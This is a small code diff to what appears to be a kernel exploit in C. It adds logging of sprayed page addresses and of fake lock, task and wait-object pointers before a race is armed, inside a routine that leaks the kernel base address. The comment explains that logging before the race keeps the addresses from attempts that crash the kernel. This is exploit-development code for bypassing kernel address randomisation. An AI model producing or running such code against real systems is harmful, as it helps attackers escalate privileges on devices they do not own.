@@ -537,6 +537,17 @@ int slide_leak_kernel_base(void) {
       continue;
     }
 
+    // Emit the sprayed addresses *before* arming the race. The post-pselect
+    // line never survives an attempt that panics, which is exactly the
+    // attempt whose addresses are worth having: the panic register dump can
+    // then be checked against these rather than inferred from the low bits of
+    // x24. Durable logging makes this line reach disk before the race starts.
+    pr_info("slide page attempt=%d page_base=%016llx fake_lock=%016llx "
+            "fake_w0=%016llx fake_task=%016llx\n",
+            slide_attempt_index, (unsigned long long)page_base,
+            (unsigned long long)fake_lock, (unsigned long long)fake_w0,
+            (unsigned long long)fake_task);
+
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
     int fds[2];
